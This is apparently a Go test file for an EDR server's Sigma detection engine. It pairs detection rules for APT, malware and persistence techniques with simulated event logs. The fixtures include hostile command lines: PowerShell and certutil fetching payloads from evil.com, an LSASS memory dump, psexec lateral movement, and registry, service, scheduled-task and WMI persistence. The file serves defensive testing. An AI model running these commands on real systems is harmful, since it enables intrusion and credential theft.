package test

import (
	"testing"

	"edr-server/internal/sigma"

	"github.com/sirupsen/logrus"
)

// TestRealWorldAPTAttacks tests detection of real APT attack patterns
func TestRealWorldAPTAttacks(t *testing.T) {
	logger := logrus.New()
	logger.SetLevel(logrus.ErrorLevel)

	t.Logf("🎯 Testing Real-World APT Attack Patterns")
	t.Logf("========================================")

	aptScenarios := []struct {
		name        string
		aptGroup    string
		description string
		rules       []string
		attackChain []map[string]interface{}
		mitre       []string
		expectDetect int // Minimum number of events that should be detected
	}{
		{
			name:     "APT29_Cozy_Bear",
			aptGroup: "APT29 (Cozy Bear)",
			description: "PowerShell-based attack chain typical of APT29",
			rules: []string{
				`title: APT29 PowerShell Activity
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains:
            - 'System.Net.WebClient'
            - 'DownloadString'
            - 'IEX'
            - 'Invoke-Expression'
    condition: selection
level: high
tags:
    - attack.execution
    - attack.t1059.001
    - apt.apt29`,

				`title: APT29 WMI Persistence
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\wmic.exe'
        CommandLine|contains:
            - '__EventFilter'
            - '__EventConsumer'
            - '__FilterToConsumerBinding'
    condition: selection
level: critical
tags:
    - attack.persistence
    - attack.t1546.003
    - apt.apt29`,
			},
			attackChain: []map[string]interface{}{
				{
					"EventID": 1,
					"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
					"CommandLine": "powershell.exe -Command \"IEX (New-Object System.Net.WebClient).DownloadString('http://evil.com/script.ps1')\"",
					"User": "SYSTEM",
				},
				{
					"EventID": 1,
					"Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
					"CommandLine": "wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name=\"BotFilter42\", EventNameSpace=\"root\\cimv2\"",
					"User": "SYSTEM",
				},
			},
			mitre: []string{"T1059.001", "T1546.003"},
			expectDetect: 2,
		},
		{
			name:     "APT28_Fancy_Bear",
			aptGroup: "APT28 (Fancy Bear)",
			description: "Credential dumping and lateral movement",
			rules: []string{
				`title: APT28 Credential Dumping
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith:
            - '\rundll32.exe'
            - '\regsvr32.exe'
        CommandLine|contains:
            - 'comsvcs.dll'
            - 'MiniDump'
            - 'lsass'
    condition: selection
level: critical
tags:
    - attack.credential_access
    - attack.t1003.001
    - apt.apt28`,

				`title: APT28 Lateral Movement
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\psexec.exe'
        CommandLine|contains: '\\\\$'
    condition: selection
level: high
tags:
    - attack.lateral_movement
    - attack.t1021.002
    - apt.apt28`,
			},
			attackChain: []map[string]interface{}{
				{
					"EventID": 1,
					"Image": "C:\\Windows\\System32\\rundll32.exe",
					"CommandLine": "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 608 C:\\temp\\lsass.dmp full",
					"User": "SYSTEM",
				},
				{
					"EventID": 1,
					"Image": "C:\\Tools\\psexec.exe",
					"CommandLine": "psexec.exe \\\\target-pc -u administrator -p password cmd.exe",
					"User": "administrator",
				},
			},
			mitre: []string{"T1003.001", "T1021.002"},
			expectDetect: 2,
		},
		{
			name:     "Lazarus_Group",
			aptGroup: "Lazarus Group",
			description: "Living off the land techniques",
			rules: []string{
				`title: Lazarus LOLBAS Abuse
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith:
            - '\certutil.exe'
            - '\bitsadmin.exe'
        CommandLine|contains:
            - '-urlcache'
            - '-split'
            - '-f'
            - '/transfer'
    condition: selection
level: medium
tags:
    - attack.command_and_control
    - attack.t1105
    - apt.lazarus`,

				`title: Lazarus Registry Persistence
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\reg.exe'
        CommandLine|contains:
            - 'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
            - '/v'
            - '/d'
    condition: selection
level: high
tags:
    - attack.persistence
    - attack.t1547.001
    - apt.lazarus`,
			},
			attackChain: []map[string]interface{}{
				{
					"EventID": 1,
					"Image": "C:\\Windows\\System32\\certutil.exe",
					"CommandLine": "certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\temp\\payload.exe",
					"User": "user",
				},
				{
					"EventID": 1,
					"Image": "C:\\Windows\\System32\\reg.exe",
					"CommandLine": "reg.exe add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"UpdateCheck\" /d \"C:\\temp\\payload.exe\"",
					"User": "user",
				},
			},
			mitre: []string{"T1105", "T1547.001"},
			expectDetect: 2,
		},
	}

	engine := sigma.NewSigmaEngine(sigma.DefaultEngineConfig(), logger)
	setupAPTFieldMappings(engine)

	// Compile all APT rules
	allRules := []string{}
	for _, scenario := range aptScenarios {
		allRules = append(allRules, scenario.rules...)
	}

	err := engine.FromRules(allRules)
	if err != nil {
		t.Fatalf("Failed to compile APT rules: %v", err)
	}

	for _, scenario := range aptScenarios {
		t.Run(scenario.name, func(t *testing.T) {
			t.Logf("🎯 APT Group: %s", scenario.aptGroup)
			t.Logf("📋 Scenario: %s", scenario.description)
			t.Logf("🏷️  MITRE: %v", scenario.mitre)

			detectedEvents := 0
			totalMatches := 0
			
			for i, event := range scenario.attackChain {
				result, err := engine.Evaluate(event)
				if err != nil {
					t.Errorf("Event %d evaluation failed: %v", i+1, err)
					continue
				}

				if len(result.MatchedRules) > 0 {
					detectedEvents++
					totalMatches += len(result.MatchedRules)
					t.Logf("   🚨 Event %d: %d rules matched", i+1, len(result.MatchedRules))
					
					for _, match := range result.MatchedRules {
						t.Logf("      - %s (%s)", match.Title, match.Level)
					}
				} else {
					t.Logf("   ⚪ Event %d: No matches", i+1)
				}
			}

			detectionRate := float64(detectedEvents) / float64(len(scenario.attackChain)) * 100
			
			t.Logf("📊 Results:")
			t.Logf("   Chain length: %d events", len(scenario.attackChain))
			t.Logf("   Events detected: %d", detectedEvents)
			t.Logf("   Detection rate: %.1f%%", detectionRate)
			t.Logf("   Total matches: %d", totalMatches)

			if detectedEvents >= scenario.expectDetect {
				t.Logf("✅ %s: Attack chain detected (expected ≥%d, got %d)", 
					scenario.aptGroup, scenario.expectDetect, detectedEvents)
			} else {
				t.Errorf("❌ %s: Insufficient detection (expected ≥%d, got %d)", 
					scenario.aptGroup, scenario.expectDetect, detectedEvents)
			}
		})
	}
}

// TestMalwareFamilies tests detection of known malware families
func TestMalwareFamilies(t *testing.T) {
	logger := logrus.New()
	logger.SetLevel(logrus.ErrorLevel)

	t.Logf("🦠 Testing Malware Family Detection")
	t.Logf("==================================")

	malwareScenarios := []struct {
		name        string
		family      string
		description string
		rules       []string
		samples     []map[string]interface{}
		expectMatch bool
	}{
		{
			name:   "Emotet_Banking_Trojan",
			family: "Emotet",
			description: "Emotet banking trojan indicators",
			rules: []string{
				`title: Emotet Process Injection
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\svchost.exe'
        CommandLine|contains: 'svchost.exe -k'
        ParentImage|endswith: '\winword.exe'
    condition: selection
level: critical
tags:
    - malware.emotet
    - attack.defense_evasion
    - attack.t1055`,

				`title: Emotet Network Activity
logsource:
    category: network_connection
    product: windows
detection:
    selection:
        ProcessName|endswith: '\svchost.exe'
        DestinationPort:
            - 80
            - 443
            - 8080
        DestinationIp|startswith:
            - '194.'
            - '185.'
    condition: selection
level: high
tags:
    - malware.emotet
    - attack.command_and_control`,
			},
			samples: []map[string]interface{}{
				{
					"EventID": 1,
					"Image": "C:\\Windows\\System32\\svchost.exe",
					"CommandLine": "svchost.exe -k netsvcs",
					"ParentImage": "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
				},
				{
					"EventID": 3,
					"ProcessName": "svchost.exe",
					"DestinationIp": "194.147.85.23",
					"DestinationPort": 443,
				},
			},
			expectMatch: true,
		},
		{
			name:   "TrickBot_Banking_Trojan",
			family: "TrickBot",
			description: "TrickBot persistence and discovery",
			rules: []string{
				`title: TrickBot Scheduled Task
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\schtasks.exe'
        CommandLine|contains:
            - '/create'
            - '/tn'
            - '/tr'
            - 'System'
    condition: selection
level: high
tags:
    - malware.trickbot
    - attack.persistence
    - attack.t1053.005`,

				`title: TrickBot Network Discovery
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\net.exe'
        CommandLine|contains:
            - 'net view'
            - 'net group "Domain Admins"'
            - 'net accounts'
    condition: selection
level: medium
tags:
    - malware.trickbot
    - attack.discovery`,
			},
			samples: []map[string]interface{}{
				{
					"EventID": 1,
					"Image": "C:\\Windows\\System32\\schtasks.exe",
					"CommandLine": "schtasks.exe /create /tn \"System\" /tr \"C:\\Users\\Public\\update.exe\" /sc onlogon",
				},
				{
					"EventID": 1,
					"Image": "C:\\Windows\\System32\\net.exe",
					"CommandLine": "net.exe group \"Domain Admins\" /domain",
				},
			},
			expectMatch: true,
		},
		{
			name:   "Cobalt_Strike_Beacon",
			family: "Cobalt Strike",
			description: "Cobalt Strike beacon activity",
			rules: []string{
				`title: Cobalt Strike Named Pipe
logsource:
    category: pipe_event
    product: windows
detection:
    selection:
        PipeName|contains:
            - '\\msagent_'
            - '\\DserNamePipe'
            - '\\srvsvc_'
            - '\\postex_'
    condition: selection
level: critical
tags:
    - malware.cobalt_strike
    - attack.command_and_control`,

				`title: Cobalt Strike Process Injection
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\rundll32.exe'
        CommandLine|contains: 'rundll32.exe'
        CommandLine|endswith: ',StartW'
    condition: selection
level: high
tags:
    - malware.cobalt_strike
    - attack.defense_evasion
    - attack.t1055`,
			},
			samples: []map[string]interface{}{
				{
					"EventID": 17,
					"PipeName": "\\\\.\\pipe\\msagent_a8b2c3d4",
					"ProcessName": "rundll32.exe",
				},
				{
					"EventID": 1,
					"Image": "C:\\Windows\\System32\\rundll32.exe",
					"CommandLine": "rundll32.exe C:\\temp\\beacon.dll,StartW",
				},
			},
			expectMatch: true,
		},
		{
			name:   "Benign_System_Activity",
			family: "Benign",
			description: "Normal system activity that should not trigger",
			rules: []string{
				`title: Suspicious PowerShell
logsource:
    category: process_creation
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains: 'malicious'
    condition: selection
level: high`,
			},
			samples: []map[string]interface{}{
				{
					"EventID": 1,
					"Image": "C:\\Windows\\System32\\svchost.exe",
					"CommandLine": "svchost.exe -k netsvcs",
					"ParentImage": "C:\\Windows\\System32\\services.exe",
				},
				{
					"EventID": 1,
					"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
					"CommandLine": "powershell.exe -Command Get-Process",
				},
			},
			expectMatch: false,
		},
	}

	for _, scenario := range malwareScenarios {
		t.Run(scenario.name, func(t *testing.T) {
			engine := sigma.NewSigmaEngine(sigma.DefaultEngineConfig(), logger)
			setupAPTFieldMappings(engine)

			err := engine.FromRules(scenario.rules)
			if err != nil {
				t.Fatalf("Failed to compile %s rules: %v", scenario.family, err)
			}

			t.Logf("🦠 Malware Family: %s", scenario.family)
			t.Logf("📋 Description: %s", scenario.description)

			detectedSamples := 0
			totalMatches := 0

			for i, sample := range scenario.samples {
				result, err := engine.Evaluate(sample)
				if err != nil {
					t.Errorf("Sample %d evaluation failed: %v", i+1, err)
					continue
				}

				if len(result.MatchedRules) > 0 {
					detectedSamples++
					totalMatches += len(result.MatchedRules)
					t.Logf("   🚨 Sample %d: %d rules matched", i+1, len(result.MatchedRules))
				}
			}

			detected := detectedSamples > 0
			detectionRate := float64(detectedSamples) / float64(len(scenario.samples)) * 100

			t.Logf("📊 Results:")
			t.Logf("   Samples tested: %d", len(scenario.samples))
			t.Logf("   Samples detected: %d", detectedSamples)
			t.Logf("   Detection rate: %.1f%%", detectionRate)
			t.Logf("   Total matches: %d", totalMatches)

			if detected == scenario.expectMatch {
				if detected {
					t.Logf("✅ %s: Correctly detected", scenario.family)
				} else {
					t.Logf("✅ %s: Correctly ignored (benign)", scenario.family)
				}
			} else {
				if scenario.expectMatch {
					t.Errorf("❌ %s: MISSED malware detection", scenario.family)
				} else {
					t.Errorf("❌ %s: FALSE POSITIVE on benign activity", scenario.family)
				}
			}
		})
	}
}

// TestAdvancedPersistenceTechniques tests various persistence methods
func TestAdvancedPersistenceTechniques(t *testing.T) {
	logger := logrus.New()
	logger.SetLevel(logrus.ErrorLevel)

	t.Logf("🔄 Testing Advanced Persistence Techniques")
	t.Logf("=========================================")

	persistenceScenarios := []struct {
		name        string
		technique   string
		description string
		rules       []string
		events      []map[string]interface{}
		expectDetect bool
	}{
		{
			name:      "Registry_Run_Key_Persistence",
			technique: "T1547.001",
			description: "Persistence via registry run keys",
			rules: []string{
				`title: Registry Run Key Persistence
logsource:
    category: registry_event
    product: windows
detection:
    selection:
        TargetObject|contains:
            - '\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\'
            - '\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\'
        EventType: SetValue
    condition: selection
level: medium
tags:
    - attack.persistence
    - attack.t1547.001`,
			},
			events: []map[string]interface{}{
				{
					"EventID": 13,
					"EventType": "SetValue",
					"TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
					"Details": "C:\\temp\\malware.exe",
				},
			},
			expectDetect: true,
		},
		{
			name:      "Service_Creation_Persistence",
			technique: "T1543.003", 
			description: "Persistence via service creation",
			rules: []string{
				`title: Suspicious Service Creation
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\sc.exe'
        CommandLine|contains:
            - 'create'
            - 'binpath='
    filter:
        CommandLine|contains: 'Microsoft'
    condition: selection and not filter
level: high
tags:
    - attack.persistence
    - attack.t1543.003`,
			},
			events: []map[string]interface{}{
				{
					"EventID": 1,
					"Image": "C:\\Windows\\System32\\sc.exe",
					"CommandLine": "sc.exe create \"FakeUpdate\" binpath= \"C:\\temp\\backdoor.exe\" start= auto",
				},
			},
			expectDetect: true,
		},
		{
			name:      "Scheduled_Task_Persistence",
			technique: "T1053.005",
			description: "Persistence via scheduled tasks",
			rules: []string{
				`title: Suspicious Scheduled Task
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\schtasks.exe'
        CommandLine|contains:
            - '/create'
            - '/sc'
            - '/tn'
    suspicious_paths:
        CommandLine|contains:
            - '\temp\'
            - '\users\public\'
            - '\appdata\'
    condition: selection and suspicious_paths
level: high
tags:
    - attack.persistence
    - attack.t1053.005`,
			},
			events: []map[string]interface{}{
				{
					"EventID": 1,
					"Image": "C:\\Windows\\System32\\schtasks.exe",
					"CommandLine": "schtasks.exe /create /tn \"WindowsUpdate\" /tr \"C:\\Users\\Public\\update.exe\" /sc daily",
				},
			},
			expectDetect: true,
		},
		{
			name:      "WMI_Event_Subscription",
			technique: "T1546.003",
			description: "Persistence via WMI event subscription",
			rules: []string{
				`title: WMI Event Subscription Persistence
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\wmic.exe'
        CommandLine|contains:
            - '__EventFilter'
            - '__EventConsumer'
            - '__FilterToConsumerBinding'
    condition: selection
level: critical
tags:
    - attack.persistence
    - attack.t1546.003`,
			},
			events: []map[string]interface{}{
				{
					"EventID": 1,
					"Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
					"CommandLine": "wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name=\"MalFilter\", EventNameSpace=\"root\\cimv2\"",
				},
			},
			expectDetect: true,
		},
	}

	engine := sigma.NewSigmaEngine(sigma.DefaultEngineConfig(), logger)
	setupAPTFieldMappings(engine)

	// Compile all persistence rules
	allRules := []string{}
	for _, scenario := range persistenceScenarios {
		allRules = append(allRules, scenario.rules...)
	}

	err := engine.FromRules(allRules)
	if err != nil {
		t.Fatalf("Failed to compile persistence rules: %v", err)
	}

	detectedTechniques := 0
	totalTechniques := len(persistenceScenarios)

	for _, scenario := range persistenceScenarios {
		t.Run(scenario.name, func(t *testing.T) {
			t.Logf("🔄 Technique: %s", scenario.technique)
			t.Logf("📋 Description: %s", scenario.description)

			detected := false
			for i, event := range scenario.events {
				result, err := engine.Evaluate(event)
				if err != nil {
					t.Errorf("Event %d evaluation failed: %v", i+1, err)
					continue
				}

				if len(result.MatchedRules) > 0 {
					detected = true
					t.Logf("   🚨 Event %d: %d rules matched", i+1, len(result.MatchedRules))
					
					for _, match := range result.MatchedRules {
						t.Logf("      - %s (%s)", match.Title, match.Level)
					}
				}
			}

			if detected == scenario.expectDetect {
				if detected {
					detectedTechniques++
					t.Logf("✅ %s: Correctly detected", scenario.technique)
				} else {
					t.Logf("✅ %s: Correctly ignored", scenario.technique)
				}
			} else {
				if scenario.expectDetect {
					t.Errorf("❌ %s: MISSED persistence technique", scenario.technique)
				} else {
					t.Errorf("❌ %s: FALSE POSITIVE", scenario.technique)
				}
			}
		})
	}

	persistenceCoverage := float64(detectedTechniques) / float64(totalTechniques) * 100
	t.Logf("📊 Persistence Detection Summary:")
	t.Logf("   Total techniques: %d", totalTechniques)
	t.Logf("   Detected techniques: %d", detectedTechniques)
	t.Logf("   Coverage: %.1f%%", persistenceCoverage)

	if persistenceCoverage >= 75 {
		t.Logf("🏆 EXCELLENT: High persistence technique coverage")
	} else if persistenceCoverage >= 50 {
		t.Logf("👍 GOOD: Decent persistence coverage")
	} else {
		t.Logf("⚠️ NEEDS IMPROVEMENT: Low persistence coverage")
	}
}

// Helper functions
func setupAPTFieldMappings(engine *sigma.SigmaEngine) {
	mappings := map[string]string{
		// Process fields
		"ProcessImage":               "Image",
		"ProcessCommandLine":         "CommandLine", 
		"ParentProcessImage":         "ParentImage",
		"ParentProcessCommandLine":   "ParentCommandLine",
		"ProcessName":                "ProcessName",
		
		// Network fields
		"DestinationIp":              "dst_ip",
		"SourceIp":                   "src_ip",
		"DestinationPort":            "dst_port",
		"SourcePort":                 "src_port",
		
		// Registry fields
		"TargetObject":               "reg_key",
		"Details":                    "reg_value",
		
		// File fields
		"TargetFilename":             "file_path",
		
		// Pipe fields
		"PipeName":                   "pipe_name",
		
		// User fields
		"User":                       "user_name",
	}

	for from, to := range mappings {
		engine.AddFieldMapping(from, to)
	}
}
